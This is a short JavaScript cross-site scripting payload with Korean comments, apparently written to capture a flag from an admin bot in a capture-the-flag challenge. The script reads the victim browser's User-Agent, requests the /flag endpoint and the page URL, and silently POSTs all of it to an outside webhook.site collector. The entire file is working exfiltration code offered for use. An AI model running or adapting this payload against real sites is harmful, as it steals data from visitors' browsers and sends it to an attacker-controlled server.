(async () => {
    // 1. User-Agent 탈취 (여기에 플래그가 있을 확률 90%)
    const userAgent = navigator.userAgent;

    // 2. 혹시 모를 /flag 경로 시도 (쿠키 없이도 접근 가능한지)
    let flagContent = "Not Found";
    try {
        const res = await fetch('/flag');
        if (res.status === 200) {
            flagContent = await res.text();
        } else {
            flagContent = `Status: ${res.status}`;
        }
    } catch (e) {
        flagContent = e.toString();
    }

    // 3. 봇이 보낸 HTTP 요청의 헤더를 확인하기 위해
    //    우리는 봇의 User-Agent를 명시적으로 body에 담아 보냅니다.
    const data = {
        msg: "Final Attempt",
        userAgent: userAgent, // <--- 핵심
        flagEndpoint: flagContent, // <--- 확인 사살
        location: window.location.href
    };

    fetch('https://webhook.site/144fdef3-ea07-4316-bff4-7619115f30f3', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify(data)
    });
})();
